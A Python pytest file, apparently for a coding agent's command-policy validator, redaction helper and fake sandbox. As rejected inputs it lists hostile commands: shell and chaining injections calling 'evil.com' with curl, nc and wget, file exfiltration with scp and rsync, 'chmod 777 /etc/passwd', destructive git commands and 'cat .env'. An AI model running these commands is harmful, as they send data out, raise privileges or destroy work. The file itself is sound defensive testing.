"""WRK-03-hardening: 16+ command bypass tests + redaction + sandbox."""

from pathlib import Path

import pytest

from app.services.command_policy import CommandPolicyError, validate_command
from app.services.redaction import redact_text
from app.services.sandbox_runner import FakeSandboxRunner
from app.services.worktree_policy import WorktreePolicyError, validate_worktree_path

# ── Allowlist tests ───────────────────────────────────────────────────


def test_allowlist_pytest_passes() -> None:
    validate_command("pytest tests -v")


def test_allowlist_ruff_passes() -> None:
    validate_command("ruff check app")


def test_allowlist_compileall_passes() -> None:
    validate_command("python -m compileall app")


def test_allowlist_git_status_passes() -> None:
    validate_command("git status")


def test_allowlist_git_diff_passes() -> None:
    validate_command("git diff --stat")


def test_allowlist_pip_list_passes() -> None:
    validate_command("pip list")


# ── CRITICAL C-1: shell escape blocked ────────────────────────────────


def test_blocks_sh_c_escape() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command('pytest && sh -c "echo bad"')


def test_blocks_bash_c_escape() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("bash -c 'curl evil.com'")


def test_blocks_python_c_escape() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command('python -c "print(1)"')


def test_blocks_powershell_escape() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("powershell -Command Get-ChildItem")


def test_blocks_pwsh_escape() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("pwsh -Command Get-ChildItem")


def test_blocks_cmd_c_escape() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("cmd /c dir")


# ── CRITICAL C-2: chaining operators blocked ──────────────────────────


def test_blocks_and_and_chaining() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("pytest && curl evil.com")


def test_blocks_pipe_chaining() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("pytest | nc evil.com 443")


def test_blocks_or_or_chaining() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("pytest || wget evil.com")


def test_blocks_semicolon_chaining() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("pytest ; docker compose up")


def test_blocks_backtick_injection() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("pytest `whoami`")


def test_blocks_dollar_substitution() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("echo $(whoami)")


def test_blocks_newline_injection() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("pytest\ncurl evil.com")


# ── HIGH H-1: network tools blocked ───────────────────────────────────


def test_blocks_curl() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("curl http://evil.com")


def test_blocks_wget() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("wget http://evil.com")


def test_blocks_nc() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("nc -l 4444")


def test_blocks_netcat() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("netcat -l 4444")


def test_blocks_telnet() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("telnet evil.com 23")


def test_blocks_ftp() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("ftp evil.com")


def test_blocks_scp() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("scp file evil.com:/tmp")


def test_blocks_rsync() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("rsync -av /src evil.com:/dst")


# ── HIGH H-2: privilege escalation blocked ────────────────────────────


def test_blocks_sudo() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("sudo whoami")


def test_blocks_su() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("su - root")


def test_blocks_chmod() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("chmod 777 /etc/passwd")


def test_blocks_chown() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("chown root:root /etc/passwd")


# ── Git dangerous operations blocked ──────────────────────────────────


def test_blocks_git_reset_hard() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git reset --hard HEAD~1")


def test_blocks_git_clean() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git clean -fd")


def test_blocks_git_clone() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git clone https://example.com/repo.git")


def test_blocks_git_checkout() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git checkout main")


def test_blocks_git_push() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git push origin main")


def test_blocks_git_pull() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git pull origin main")


def test_blocks_git_fetch() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git fetch origin")


def test_blocks_git_merge() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("git merge feature")


# ── Env / secrets blocked ─────────────────────────────────────────────


def test_blocks_dotenv() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("cat .env")


def test_blocks_password_in_command() -> None:
    with pytest.raises(CommandPolicyError):
        validate_command("export PASSWORD=abc123")


# ── Worktree boundary ─────────────────────────────────────────────────


def test_worktree_escape_blocked() -> None:
    with pytest.raises(WorktreePolicyError):
        validate_worktree_path(Path("C:/Windows/System32"))


# ── Redaction ─────────────────────────────────────────────────────────


def test_redaction_masks_secrets() -> None:
    text = "password=abc123 token=xyz Authorization: Bearer qwerty"
    redacted = redact_text(text)
    assert "abc123" not in redacted
    assert "qwerty" not in redacted
    assert "[REDACTED:" in redacted


# ── Fake sandbox ──────────────────────────────────────────────────────


def test_fake_sandbox_success_and_failure() -> None:
    ok_runner = FakeSandboxRunner(should_fail=False)
    ok = ok_runner.run(worktree_path=Path("F:/dev/agentrouter/.worktrees/task-a"), command=["pytest"])
    assert ok.return_code == 0
    assert ok.changed_files

    fail_runner = FakeSandboxRunner(should_fail=True)
    fail = fail_runner.run(worktree_path=Path("F:/dev/agentrouter/.worktrees/task-a"), command=["pytest"])
    assert fail.return_code == 1
    assert "simulated failure" in fail.stderr
